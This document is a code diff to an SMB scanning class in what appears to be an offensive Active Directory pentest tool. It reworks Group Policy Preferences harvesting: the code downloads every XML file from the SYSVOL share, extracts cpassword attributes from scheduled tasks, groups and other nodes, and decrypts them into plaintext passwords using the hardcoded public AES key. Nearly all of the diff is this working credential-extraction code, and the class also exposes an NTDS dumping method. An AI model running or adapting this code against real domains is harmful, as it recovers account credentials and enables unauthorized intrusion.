@@ -8,7 +8,8 @@ import traceback
 import struct
 import ntpath
 import datetime
-import xml.etree.ElementTree as ET
+#import xml.etree.ElementTree as ET
+from xml.dom import minidom
 from io import BytesIO
 from Cryptodome.Cipher import AES
 from base64 import b64decode
@@ -1110,22 +1111,122 @@ class SMBScan:
         gpp_files = []
         for path in self.list_content('\\', 'SYSVOL', recurse=10):
             filename = path['name'].split('\\')[-1]
-            if filename in ['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml']:
+            if filename.endswith(".xml"):
                 gpp_files.append(path['name'])
 
         for path in gpp_files:
             buf = BytesIO()
             self.conn.getFile('SYSVOL', path, buf.write)
+
+            root = minidom.parseString(buf.getvalue())
+            xmltype = root.childNodes[0].tagName
+            # function to get attribute if it exists, returns "" if empty
+            read_or_empty = lambda element, attribute: (element.getAttribute(attribute) if element.getAttribute(attribute) is not None else "")
+
+            # ScheduledTasks
+            if xmltype == "ScheduledTasks":
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            """
+                            print({
+                                "tagName": xmltype,
+                                "attributes": [
+                                    ("name", read_or_empty(task, "name")),
+                                    ("runAs", read_or_empty(property, "runAs")),
+                                    ("cpassword", read_or_empty(property, "cpassword")),
+                                    ("password", self.__decrypt_cpassword(read_or_empty(property, "cpassword"))),
+                                    ("changed", read_or_empty(property.parentNode, "changed")),
+                                ],
+                                "file": path
+                            })
+                            """
+                            newname = read_or_empty(property, "newName")
+                            username = read_or_empty(property, "userName")
+                            password = self.__decrypt_cpassword(read_or_empty(property, "cpassword"))
+
+                            if password != "":
+                                yield {
+                                    'newname': newname,
+                                    'username': username,
+                                    'password': password,
+                                    'path': path,
+                                }
+            elif xmltype == "Groups":
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            """
+                            print({
+                                "tagName": xmltype,
+                                "attributes": [
+                                    ("newName", read_or_empty(property, "newName")),
+                                    ("userName", read_or_empty(property, "userName")),
+                                    ("cpassword", read_or_empty(property, "cpassword")),
+                                    ("password", self.__decrypt_cpassword(read_or_empty(property, "cpassword"))),
+                                    ("changed", read_or_empty(property.parentNode, "changed")),
+                                ],
+                                "file": path
+                            })
+                            """
+                            newname = read_or_empty(property, "newName")
+                            username = read_or_empty(property, "userName")
+                            password = self.__decrypt_cpassword(read_or_empty(property, "cpassword"))
+
+                            if password != "":
+                                yield {
+                                    'newname': newname,
+                                    'username': username,
+                                    'password': password,
+                                    'path': path,
+                                }
+            else:
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            """
+                            print({
+                                "tagName": xmltype,
+                                "attributes": [
+                                    ("newName", read_or_empty(property, "newName")),
+                                    ("userName", read_or_empty(property, "userName")),
+                                    ("cpassword", read_or_empty(property, "cpassword")),
+                                    ("password", self.__decrypt_cpassword(read_or_empty(property, "cpassword"))),
+                                    ("changed", read_or_empty(property.parentNode, "changed")),
+                                ],
+                                "file": path
+                            })
+                            """
+
+                            newname = read_or_empty(property, "newName")
+                            username = read_or_empty(property, "userName")
+                            password = self.__decrypt_cpassword(read_or_empty(property, "cpassword"))
+
+                            if password != "":
+                                yield {
+                                    'newname': newname,
+                                    'username': username,
+                                    'password': password,
+                                    'path': path,
+                                }
+
+
+            """
             xml = ET.fromstring(buf.getvalue())
 
-            if 'Groups.xml' in path:
+            tag = xml.tag
+
+            if tag == 'Groups':
                 xml_section = xml.findall("./User/Properties")
+
+            elif tag == 'ScheduledTasks':
+                xml_section = xml.findall('./Task/Properties')
 
             elif 'Services.xml' in path:
                 xml_section = xml.findall('./NTService/Properties')
-
-            elif 'ScheduledTasks.xml' in path:
-                xml_section = xml.findall('./Task/Properties')
 
             elif 'DataSources.xml' in path:
                 xml_section = xml.findall('./DataSource/Properties')
@@ -1138,6 +1239,7 @@ class SMBScan:
 
             for attr in xml_section:
                 props = attr.attrib
+                print(str(props))
 
                 if 'cpassword' in props:
 
@@ -1152,20 +1254,24 @@ class SMBScan:
                         'password': password,
                         'path': path,
                     }
+            """
 
     def __decrypt_cpassword(self, cpassword):
+        if len(cpassword) != 0:
 
-        #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
+            #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
 
-        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
-        key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
-        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
-        password = b64decode(cpassword)
-        IV = "\x00" * 16
-        decrypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
-        padding_bytes = decrypted[-1]
-        decrypted = decrypted[:-padding_bytes]
-        return decrypted.decode('utf16')
+            # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
+            key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
+            cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
+            password = b64decode(cpassword)
+            IV = "\x00" * 16
+            decrypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
+            padding_bytes = decrypted[-1]
+            decrypted = decrypted[:-padding_bytes]
+            return decrypted.decode('utf16')
+        else:
+            return ""
 
     def dump_ntds(self, method, callback_func=None):
         self.enable_remoteops()
